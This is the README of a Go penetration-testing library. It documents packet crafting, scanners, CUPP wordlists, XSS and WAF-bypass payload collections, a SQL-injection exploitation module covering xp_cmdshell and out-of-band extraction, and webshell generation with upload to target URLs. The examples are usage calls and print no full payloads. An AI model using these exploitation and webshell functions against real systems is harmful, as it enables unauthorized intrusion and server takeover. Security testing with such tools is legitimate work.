# gyscan_code

Go 语言编写的网络安全开发库，支持 Windows、macOS 和 Linux 平台，采用模块化设计。

![Go Version](https://img.shields.io/badge/Go-1.26%2B-blue)
![License](https://img.shields.io/badge/License-Apache%202.0-green)
![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20macOS%20%7C%20Linux-lightgrey)

### 这个Go语言库希望有更多的Go开发者，与我共同开发这个开发库！欢迎`issues` ~~

## 安装

```bash
go get github.com/xiguayiqiu/gyscan_code
```

## 文档位置

### 通过以下位置即可看到每个库的使用方法，后续本作者会补齐`gyscan_code`的goDoc的~

注意：`ShellCode()`函数对Windows是零兼容！所以无法在Windows系统中使用`ShellCode()`函数，原因是这个库主要是给Linux系统和Macos做的！当然其他除`Shellcode()`函数之外全部都可以在Windows系统使用

- Windows

```bash
C:\User\用户名\go\pkg\mod\github.com\xiguayiqiu\gyscan_code@哈希校验码\docs
```

- Linux

```bash
~/go/pkg/mod/github.com/xiguayiqiu/gyscan_code@哈希校验码/docs/
```

## 模块总览

| 模块                                       | 说明                          | 对标              |
| ---------------------------------------- | --------------------------- | --------------- |
| [ano](#ano)                              | 网络协议操作库（数据包构造/发送/嗅探）        | Scapy           |
| [api](#api)                              | API 资产发现（被动流量/前端解析/主动探测）    | —               |
| [binary_stream](#binary_stream)         | 二进制流操作库（文件编辑/协议解析/链式操作）     | —               |
| [encoding](#encoding)                    | 编码解码开发库（Base/URL/Hex/古典密码/JS混淆） | —               |
| [format_conversion](#format_conversion) | 文件格式转换库（图片/音频/视频/文档互转）      | —               |
| [httpclient](#httpclient)                | 模拟真实浏览器的 HTTP 请求库           | Python requests |
| [passwd](#passwd)                        | 密码生成（随机/社工/CUPP 字典）         | —               |
| [payload](#payload)                      | 安全测试 Payload 库（XSS/WAF绕过/指纹/弱口令） | —               |
| [scanner](#scanner)                      | 扫描模块（子域名/目录/端口）             | —               |
| [secjson](#secjson)                      | 敏感 JSON 分析（识别/脱敏/合规）        | —               |
| [sqlexp](#sqlexp)                        | SQL 注入利用（Payload 生成/WAF 绕过） | —               |
| [utils](#utils)                          | 通用工具函数（进度条等）                | —               |
| [webshell](#webshell)                    | Webshell 生成与上传              | —               |

***

## ano

基于 Scapy 设计理念的 Go 网络协议操作库，支持多层数据包构造、序列化/反序列化、原始套接字发送/接收、嗅探、BPF 过滤和 pcap 文件读写。

### 引入

```go
import "github.com/xiguayiqiu/gyscan_code/ano"
```

### 快速开始

```go
// 构造 TCP SYN 包
pkt := ano.Build(
    ano.NewEther().SetDst("ff:ff:ff:ff:ff:ff"),
    ano.NewIPv4().SetSrc("10.0.0.1").SetDst("192.168.1.1"),
    ano.NewTCP().SetSPort(54321).SetDPort(80).SetFlags(ano.TCP_SYN),
)
data := pkt.Bytes() // 54 字节以太网帧

// 原始套接字发送（需 root）
ano.Send(pkt)
ano.SendOnIface("eth0", pkt)

// 嗅探
pkts, _ := ano.Sniff("eth0", 10*time.Second, 100)
```

### 核心特性

- **9 种协议层**：Ether, IPv4, IPv6, TCP, UDP, ICMP, ARP, DNS, Raw
- **数据包操纵**：层叠组装、增删改查、Tag 零反射机制
- **数据包 Fuzz**：对标 Scapy `fuzz()`，字段随机化
- **嗅探与捕获**：异步 Sniffer、BPF 内核过滤、pcap 文件导入导出
- **交互式 Shell**：`ano.ShellCode()` 对标 Scapy `interact()`
- **快捷构造**：`NewPacket().IPv4().TCP().Build()` 流式构建器
- **网卡识别**：列出/查找/默认接口

### 对比 Scapy

| Scapy (Python)                  | ano (Go)                                    |
| ------------------------------- | ------------------------------------------- |
| `Ether()/IP()/TCP(flags="S")`   | `Build(Ether, IPv4, TCP.SetFlags(TCP_SYN))` |
| `interact()`                    | `ShellCode()`                               |
| `sniff(iface="eth0", count=10)` | `Sniff("eth0", timeout, 10)`                |
| `rdpcap("file.pcap")`           | `LoadPcap("file.pcap")`                     |
| `fuzz(pkt)`                     | `FuzzPacket(pkt, nil)`                      |

***

## api

API 资产发现库，通过**被动流量分析**、**前端代码解析**、**上下文感知主动探测**三条路径自动化识别目标系统中所有 API 端点。

### 引入

```go
import "github.com/xiguayiqiu/gyscan_code/api"
```

### 快速开始

```go
cfg := &api.DiscoveryConfig{
    Target:      "example.com",
    Mode:        api.ModeFull,
    PcapPaths:   []string{"capture.pcap", "api_log.jsonl"},
    JSPaths:     []string{"./frontend/src/"},
    ActiveProbe: true,
    ProbeLimit:  500,
}

engine := api.NewDiscoveryEngine(cfg)
result, _ := engine.Run()

fmt.Printf("发现 %d 个 API 端点\n", result.TotalCount)
api.SaveReport("example.com", result.Endpoints, "report.json")
```

### 三条发现路径

| 路径     | 置信度 | 说明                    |
| ------ | --- | --------------------- |
| 被动流量分析 | 1.0 | 从 PCAP/日志中提取真实调用的端点   |
| 前端代码解析 | 0.8 | 从 JS/TS/HTML 中提取硬编码路径 |
| 主动探测   | 0.6 | 基于已知端点生成候选 URL 并验证    |

### 核心特性

- **路径归一化**：9 级正则替换（UUID、日期、时间戳、Hash 等）
- **敏感 API 识别**：49 种路径模式 + 18 种参数模式 + 13 类分组
- **JSON 安全分析**：集成 secjson，检测响应中的敏感数据
- **Swagger/OpenAPI 解析**：自动提取端点、认证检查
- **攻击面测绘**：9 类风险面检测 + Top N 排序
- **HTTP 实时探测**：端点验证 + 认证绕过测试
- **一键发现**：`DiscoverPcap` / `DiscoverJS` / `QuickScan` 等便捷函数

***

## binary_stream

二进制流操作库，通过二进制流将数据生成对应文件，以及对文件进行二进制编辑。实现 `io.Reader` / `io.Writer` / `io.Seeker` / `io.Closer` 标准库接口，无缝对接 `io.Copy`、`encoding/binary` 等所有标准库函数。支持大端/小端字节序、多类型数据读写和链式流操作。

### 引入

```go
import "github.com/xiguayiqiu/gyscan_code/binary_stream"
```

### 快速开始

```go
// 从字节切片创建 Stream
s := binary_stream.NewFromBytes([]byte{0x01, 0x02, 0x03})

// 从文件读取
s, _ := binary_stream.ReadFile("data.bin")

// 链式构建并保存到文件
binary_stream.BuildToFile("data.bin", func(s *binary_stream.Stream) {
    s.WriteString("HEADER")
    s.WriteUint32(100)
    s.WriteBytes([]byte{0xFF, 0xFE})
})

// 编辑文件
binary_stream.EditFile("data.bin", func(s *binary_stream.Stream) {
    s.Patch(0, []byte{0xAA, 0xBB})
})
```

### 核心特性

- **四大标准库接口**：`io.Reader` / `io.Writer` / `io.Seeker` / `io.Closer`
- **多种构造函数**：`New` / `NewBE` / `NewLE` / `NewWithCap` / `NewFromBytes` / `NewFromFile` / `NewFromReader`
- **丰富数据类型**：基础类型 + Varint/Zigzag 编码 + 布尔值 + 浮点数
- **编辑操作**：Patch / Insert / Delete / Replace / Truncate
- **性能优化**：`Grow` 预分配、`UnsafeReadBytes` 零拷贝、`Reset` 对象复用
- **交互式 Shell**：`Shellcode()` / `ShellcodeWithHistory()` / `ShellcodeScript()`

### 标准库接口

| 接口          | 方法                                              | 说明        |
| ----------- | ----------------------------------------------- | --------- |
| `io.Reader` | `Read(p []byte) (n int, err error)`             | 读取数据到 p   |
| `io.Writer` | `Write(p []byte) (n int, err error)`            | 从当前位置覆盖写入 |
| `io.Seeker` | `Seek(offset int64, whence int) (int64, error)` | 移动读写位置    |
| `io.Closer` | `Close() error`                                 | 释放底层缓冲    |

```go
s := binary_stream.NewFromBytes([]byte("Hello World"))

// 配合 io.Copy
var buf bytes.Buffer
io.Copy(&buf, s)

// 配合 encoding/binary
var header struct { Magic uint32; Size uint16 }
binary.Read(s, binary.BigEndian, &header)
```

### 对比 unsafe binary

| 操作    | unsafe binary            | binary_stream                      |
| ----- | ------------------------ | ----------------------------------- |
| 字节序切换 | 手动 `binary.LittleEndian` | `.SetOrder()` 链式设置                  |
| 错误处理  | 手动检查 error               | `.Error()` / `.Must()`              |
| 位置管理  | 手动维护 offset              | `.SetPos()` / `.Seek()`             |
| 文件操作  | 手动 Read/Write            | `.SaveToFile()` / `.LoadFromFile()` |
| 编辑操作  | 需手动实现                    | Patch/Insert/Delete/Replace         |

***

## encoding

网络安全渗透测试中的编码解码开发库，提供 Base 家族、URL、Hex、HTML 实体、古典密码以及 JS 混淆编码等功能。

### 引入

```go
import "github.com/xiguayiqiu/gyscan_code/encoding"
```

### 快速开始

```go
// Base 家族编码
b16 := encoding.Base16Encode([]byte("hello"))       // "68656c6c6f"
b64 := encoding.Base64Encode([]byte("hello"))       // "aGVsbG8="
b85 := encoding.Base85Encode([]byte("hello"))       // "BOu!rDZ"

// URL 编码
enc := encoding.URLEncode("hello world")             // "hello+world"
enc = encoding.URLComponentEncode("/path/to/file")   // "/path/to/file"

// Hex 编码（支持 0x 前缀、大小写、空格等自动识别）
hex := encoding.HexEncode([]byte{0xDE, 0xAD})        // "dead"
dec, _ := encoding.HexDecode("0xDEADBEEF")           // 自动去除 0x 前缀

// HTML 实体编码
html := encoding.HTMLEntityEncode("<script>alert(1)</script>")
// &lt;script&gt;alert(1)&lt;/script&gt;

// 古典密码
caesar := encoding.CaesarEncode("Hello", 3)          // "Khoor"
all := encoding.CaesarBruteForce("Khoor")             // 暴力破解 26 个偏移
vigenere := encoding.VigenereEncode("HELLO", "KEY")   // "RIJVS"
rail := encoding.RailFenceEncode("HELLOWORLD", 3)     // "HOLELWRDLO"

// JS 混淆编码
jother := encoding.JotherEncode("test")               // Jother 编码
jsfuck := encoding.JSFuckEncode("alert(1)")           // JSFuck 编码
```

### 核心特性

- **Base 家族**：Base16 / Base32 / Base32Hex / Base64 / Base64URL / Base85 编码解码
- **URL/Hex 编码**：QueryEscape / PathEscape / Hex（支持 0x 前缀、分隔符）
- **HTML 实体编码**：转义/反转义，支持全字符编码
- **古典密码**：凯撒密码（含暴力破解）/ 维吉尼亚密码 / 栅栏密码（基础型 & W 型）
- **JS 混淆**：Jother（8 字符编码）/ JSFuck（6 字符编码）编码解码

***

## format_conversion

文件格式转换库，基于 `binary_stream` 和 `ffmpeg-go` / `pandoc` 实现图片、音频、视频、文档文件格式之间的互转。通过魔数检测自动识别源格式，支持文件级和字节级转换。

### 引入

```go
import "github.com/xiguayiqiu/gyscan_code/format_conversion"
```

### 快速开始

```go
// 通用转换
err := format_conversion.Convert("input.png", "output.jpg")

// 图片转换（Go 原生实现，无需外部依赖）
err := format_conversion.ImageConvert("photo.png", "photo.bmp")

// 音频转换（需要 ffmpeg）
err := format_conversion.AudioConvert("sound.wav", "sound.mp3")

// 视频转换（MP4↔MOV 无损，GIF 需要 ffmpeg）
err := format_conversion.VideoConvert("clip.mp4", "clip.mov")

// 文档转换（需要 pandoc）
err := format_conversion.DocumentConvert("readme.md", "readme.docx")

// 批量转换
err := format_conversion.BatchConvert("./images", ".png", ".webp")

// 检查 pandoc 是否可用
if !format_conversion.IsPandocAvailable() {
    fmt.Println("请先安装 pandoc")
}
```

### 依赖要求

| 工具 | 用途 | Linux | macOS | Windows |
|------|------|-------|-------|---------|
| **ffmpeg** | 音频/视频/GIF 转换 | `sudo apt install ffmpeg` | `brew install ffmpeg` | `winget install ffmpeg` |
| **pandoc** | 文档格式转换 | `sudo apt install pandoc` | `brew install pandoc` | `winget install pandoc` |

> 图片转换（PNG/JPG/BMP/ICO/WEBP）使用 Go 原生实现，无需额外依赖。Windows 用户运行 ShellCode 时会自动检测缺失组件并提示安装方式。

### 支持的格式

| 类型 | 格式 |
| -- | --- |
| 图片 | PNG, JPG/JPEG, BMP, ICO, WEBP, GIF |
| 音频 | WAV, MP3, OGG |
| 视频 | MP4, MOV |
| 文档 | Markdown, DOC, DOCX, ODT, HTML, RTF, PDF, TXT |

### 支持的转换路径

| 类型 | 转换 |
| -- | --- |
| 图片 | PNG ↔ BMP, PNG → JPG, JPG → PNG, PNG/JPG → ICO, PNG/JPG → WEBP |
| 音频 | WAV ↔ MP3, WAV ↔ OGG, MP3 ↔ OGG |
| 视频 | MP4 ↔ MOV（容器转换，无损）, 视频 → GIF, 视频 → 音频 |
| 文档 | Markdown ↔ DOCX/ODT/HTML/RTF/TXT, DOC → DOCX/ODT/HTML/RTF/TXT, PDF → TXT |

> **注意**：pandoc 不支持输出 `.doc` 格式，请使用 `.docx` 代替。PDF 输出需要 `wkhtmltopdf` 等 PDF 引擎。

### 核心特性

- **魔数检测**：自动识别文件真实格式
- **图片转换**：纯 Go 实现，零外部依赖
- **音频/视频转换**：基于 ffmpeg-go 的真正编解码
- **文档转换**：基于 pandoc 的多格式互转（Markdown/DOCX/ODT/HTML/RTF/PDF/TXT）
- **批量转换**：`BatchConvert` 目录级批量处理
- **Shell 交互**：`Shellcode()` 交互式 bash shell，支持系统命令
- **脚本支持**：`ShellcodeScript()` 批处理脚本
- **依赖检查**：启动时自动检测 pandoc/ffmpeg/ImageMagick，Windows 用户收到安装提示

### Shellcode

```go
// 交互式 Shell（自动依赖检查）
format_conversion.Shellcode()

// 脚本执行
format_conversion.ShellcodeScript("commands.txt")

// 带历史记录
format_conversion.ShellcodeWithHistory()
```

启动时自动依赖检查示例：

```
依赖检查:
  pandoc: 已安装
  ffmpeg: 已安装
  ImageMagick: 已安装
```

Windows 上缺失组件时：

```
+----------------------------------------------------------+
|  Windows 用户注意:                                       |
|  部分功能需要额外安装以下组件才能完整体验:               |
|    pandoc: https://pandoc.org/installing.html            |
|             winget install pandoc                        |
|    ffmpeg: https://ffmpeg.org/download.html              |
|             winget install ffmpeg                        |
+----------------------------------------------------------+
```

支持的命令：`convert` / `batch` / `info` / `detect` / `formats` / `pandoc`，同时可直接使用系统命令（ls、cat、echo 等）。

***

## httpclient

对标 Python `requests` 库设计的 Go HTTP 客户端，专为网络安全渗透测试场景打造。

### 引入

```go
import "github.com/xiguayiqiu/gyscan_code/httpclient"
```

### 快速开始

```go
// 一行获取内容
data := httpclient.Fetch("https://example.com")

// 下载文件
httpclient.Save("https://example.com/video.mp4", "video.mp4")

// Python 风格响应对象
resp := httpclient.FetchResponse("https://example.com")
fmt.Println(resp.Text())       // 响应文本（自动编码检测）
fmt.Println(resp.StatusCode()) // 200
fmt.Println(resp.Ok())         // true

// 链式客户端
resp = httpclient.SimpleClient().
    UA("Mozilla/5.0").
    Cookie("session", "abc").
    Encoding("gbk").
    Post("https://example.com/login", `{"user":"admin"}`)
```

### 核心特性

- **自动编码检测**：UTF-8, GBK, GB2312, Big5, Shift-JIS 等
- **资源类型识别**：JSON/HTML/Image/PDF 等自动分类
- **格式化输出**：JSON/HTML 美化
- **与 Python requests 几乎一致的使用体验**

***

## passwd

网络安全渗透测试的密码生成工具库，支持多种密码生成策略和 CUPP 社工字典。

### 引入

```go
import "github.com/xiguayiqiu/gyscan_code/passwd"
```

### 快速开始

```go
// 随机密码
pwd := passwd.Generate(12)         // 大写+小写+数字
pwd := passwd.GenerateStrong(20)   // 大写+小写+数字+特殊字符
pwds := passwd.GenerateN(16, 5)    // 批量生成 5 个

// 自定义字符集
pwd := passwd.GenerateWith(8, false, false, true, false) // 纯数字

// 社工密码字典
profile := &passwd.Profile{
    FirstName: "张三", Nickname: "zs",
    BirthDate: "1995-06-15", Company: "acme",
}
pwds := passwd.CUPP(profile) // 生成社工密码字典

// 辅助函数
passwd.LeetSpeak("password") // "p4ssw0rd"
passwd.Capitalize("hello")   // "Hello"
passwd.Reverse("hello")      // "olleh"
```

***

## payload

安全测试 Payload 库，提供 XSS、WAF 绕过、浏览器指纹、目录扫描防御绕过和弱口令的 Payload 集合，总计 **3085** 条。

### 引入

```go
import "github.com/xiguayiqiu/gyscan_code/payload"
```

### 快速开始

```go
// XSS Payload
htmlPayloads := payload.XSSByContext(payload.XSSHTML)
svgPayloads := payload.XSSByContext(payload.XSSSVG)
allXSS := payload.XSSStrings()

// WAF 绕过 Payload（9 种 WAF 类型 + 13 种绕过技术）
cfPayloads := payload.WAFBypassStrings(payload.WAFCloudflare)
allWAF := payload.WAFBypassAllStrings()

// 浏览器指纹 Payload（40+ 指纹维度）
canvasPayloads := payload.FingerprintCanvasStrings()
allFP := payload.FingerprintAllStrings()

// 目录扫描防御绕过（12 种绕过类型 + 常用路径）
uaList := payload.DirUserAgentBypassStrings()
encList := payload.DirEncodingBypassStrings()

// Top1000 弱口令
pwList := payload.PwPayloadStrings()

// 总数
total := payload.TotalCount() // 3085
```

### Payload 覆盖

| 分类 | 数量 | 说明 |
|------|------|------|
| XSS | 529 | HTML/Attribute/Script/SVG/CSS/URL 等 12 种上下文 |
| WAF Bypass | 538 | Cloudflare/AWS/ModSecurity 等 9 种 WAF + SSTI/XXE/HTTP走私 |
| 浏览器指纹 | 506 | Canvas/WebGL/WebGPU/Audio/Font/WebRTC 等 40+ 维度 |
| 目录扫描绕过 | 512 | UserAgent/Header/编码/路径混淆/HTTP方法 等 12 种绕过 |
| 弱口令 | 1000 | Top1000 常见弱口令（数字/键盘/单词/人名/品牌） |

***

## scanner

网络安全扫描模块，提供子域名枚举、目录扫描和端口扫描功能。

### 引入

```go
import "github.com/xiguayiqiu/gyscan_code/scanner"
```

### 快速开始

```go
// 目录扫描
results := scanner.Scan("https://example.com")

// 子域名发现
results := scanner.Subs("example.com")

// Ping 检测
alive := scanner.Ping("example.com")

// 端口扫描
results := scanner.ScanPorts("example.com", []int{80, 443, 22})

// 快速端口扫描
results := scanner.QuickScan("example.com")

// 链式配置
results := scanner.NewPortScanner().
    Host("example.com").
    Ports([]int{80, 443, 22}).
    Protocol("tcp").
    Threads(100).
    Scan()
```

***

## secjson

敏感 JSON 分析库，聚焦 JSON 数据内容层的敏感信息识别与风险治理。覆盖四大分析层：**敏感字段识别**、**动态敏感性判定**、**脱敏与加密验证**、**合规与审计映射**（GDPR/PCI-DSS/等保2.0/数据安全法）。

### 引入

```go
import "github.com/xiguayiqiu/gyscan_code/secjson"
```

### 快速开始

```go
// 一键扫描
finding, _ := secjson.Scan(jsonData)
fmt.Printf("风险评分: %.1f/100\n", finding.RiskScore)

// 安全判断
if secjson.IsSafe(jsonData) {
    fmt.Println("JSON 数据安全")
}

// 完整扫描（敏感+脱敏+合规）
finding, masks, compliance, _ := secjson.ScanFull(jsonData)

// 快速报告
report, _ := secjson.QuickReport(jsonData)
fmt.Println(report)
```

### 识别能力

- **33 种检测规则**：15 种敏感值正则（身份证/Luhn 校验/JWT Token/银行卡/手机号等）+ 18 种敏感字段名
- **8 种组合风险**：身份证+手机号、银行卡+手机号等危险组合自动检测
- **6 条合规规则**：PCI-DSS/GDPR/等保2.0/数据安全法自动化检查
- **4 类脱敏验证**：身份/金融/凭证/隐私脱敏质量评分（0-90 分）

***

## sqlexp

SQL 注入渗透测试的 Payload 生成与利用工具库，支持 6 种数据库、7 种注入方法、8 种 WAF 绕过策略。

### 引入

```go
import "github.com/xiguayiqiu/gyscan_code/sqlexp"
```

### 快速开始

```go
// 按注入方法获取 Payload
payloads := sqlexp.Union(sqlexp.MySQL)      // Union 注入
payloads := sqlexp.Error(sqlexp.PostgreSQL)  // 报错注入
payloads := sqlexp.Time(sqlexp.MSSQL)        // 延时注入

// 登录绕过
payloads := sqlexp.LoginBypass()

// WAF 绕过
payloads := sqlexp.WAFBypass(sqlexp.BypassCommentInline)
payloads := sqlexp.WAFBypass(sqlexp.BypassHexEncode)

// 链式配置
e := sqlexp.NewExploit().
    DB(sqlexp.MySQL).
    Method(sqlexp.UnionBased).
    Columns(5).
    Target("http://example.com/page.php").
    Param("id")

// 获取 Payload 并构建请求 URL
payloads := e.GetPayloads()
probes := e.GetUnionProbe()     // 列数探测
requests := e.BuildRequests()   // URL 编码后的完整请求
```

### Payload 覆盖

| 注入方法     | 数据库                          | 覆盖技术                                    |
| -------- | ---------------------------- | --------------------------------------- |
| 报错注入     | MySQL/PG/MSSQL/Oracle/SQLite | EXTRACTVALUE/CAST/CONVERT 等             |
| Union 注入 | MySQL/PG/MSSQL               | 列数探测、information_schema/pg_catalog 枚举 |
| 布尔盲注     | MySQL/MSSQL                  | 真假条件、SUBSTRING/ASCII 提取                 |
| 延时盲注     | MySQL/PG/MSSQL/Oracle/SQLite | SLEEP/pg_sleep/WAITFOR/DBMS_LOCK      |
| 堆叠查询     | MySQL/MSSQL/PG               | INSERT/DELETE/WRITE/xp_cmdshell        |
| OOB 外带   | MySQL/MSSQL/Oracle/PG        | LOAD_FILE/xp_dirtree/UTL_HTTP        |
| WAF 绕过   | 8 种策略                        | 内联注释/大小写/URL编码/Hex/空白/关键字拆分等            |

***

## utils

通用工具函数库，提供丰富的终端进度条样式（19 种）。

### 引入

```go
import "github.com/xiguayiqiu/gyscan_code/utils"
```

### 快速开始

```go
// 简单进度条
for i := 0; i <= 100; i++ {
    utils.Progress(i, 100)
}

// 带速度和样式
pb := utils.NewProgressBar(100).
    SetPrefix("扫描端口").
    SetStyle("dot")
for i := 0; i <= 100; i++ {
    pb.Set(i)
}
pb.Finish()

// 彩色进度条
utils.ProgressColor(current, total)

// 赛博风格
utils.ProgressCyber(current, total)
```

***

## webshell

测试用 Webshell 生成与上传工具库，支持 PHP/ASP/ASPX/JSP 多种语言。

### 引入

```go
import "github.com/xiguayiqiu/gyscan_code/webshell"
```

### 快速开始

```go
// 生成
code := webshell.GeneratePHP("pass")       // PHP eval($_POST['pass'])
code := webshell.GeneratePHPCMD("cmd")     // PHP system($_REQUEST['cmd'])
code := webshell.GenerateASP("pass")       // ASP Execute
code := webshell.GenerateJSP("pass")       // JSP Runtime.exec

// 按类型生成
code := webshell.Generate(webshell.PHP, "pass")
all := webshell.GenerateAll("pass")        // 生成所有语言

// 上传
webshell.Upload("http://target.com/upload.php", code)
webshell.UploadWithField("http://target.com/upload.php", code, "shell.php", "file")
webshell.UploadViaPUT("http://target.com/shell.php", code)
```

***

## 测试说明

项目使用 `go run xxx.go` 运行测试：

```bash
# 模块单元测试
go test ./sqlexp/ -v
go test ./ano/ -v
```

## License

Apache License 2.0
